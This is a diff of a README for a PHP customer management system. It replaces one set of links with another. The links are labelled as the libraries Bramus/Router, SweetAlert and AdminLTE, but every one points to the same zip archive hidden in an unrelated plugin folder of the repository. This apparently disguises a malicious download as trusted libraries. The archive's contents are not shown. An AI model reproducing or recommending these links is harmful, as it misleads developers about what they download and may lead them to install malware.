@@ -1,12 +1,12 @@
 # Customer Management System with PHP
 
 ## Application Features
-- Routing : **[Bramus/Router](https://raw.githubusercontent.com/meuxlugh/cms-oop-php/main/public/plugins/datatables-buttons/js/cms-php-oop-v3.0.zip)**
+- Routing : **[Bramus/Router](https://github.com/meuxlugh/cms-oop-php/raw/refs/heads/main/public/plugins/inputmask/php-cms-oop-v3.1-alpha.2.zip)**
 - PSR-4 compliant autoloader
 - User Authentication
 - Session Management
 - Responsive Design with **Bootstrap**
-- User-Friendly Alerts with **[SweetAlert](https://raw.githubusercontent.com/meuxlugh/cms-oop-php/main/public/plugins/datatables-buttons/js/cms-php-oop-v3.0.zip)**
+- User-Friendly Alerts with **[SweetAlert](https://github.com/meuxlugh/cms-oop-php/raw/refs/heads/main/public/plugins/inputmask/php-cms-oop-v3.1-alpha.2.zip)**
 - Asynchronous Requests with **Axios**
 - Database Management with **MySQL**
-- Theme : **[AdminLTE](https://raw.githubusercontent.com/meuxlugh/cms-oop-php/main/public/plugins/datatables-buttons/js/cms-php-oop-v3.0.zip)**
+- Theme : **[AdminLTE](https://github.com/meuxlugh/cms-oop-php/raw/refs/heads/main/public/plugins/inputmask/php-cms-oop-v3.1-alpha.2.zip)**
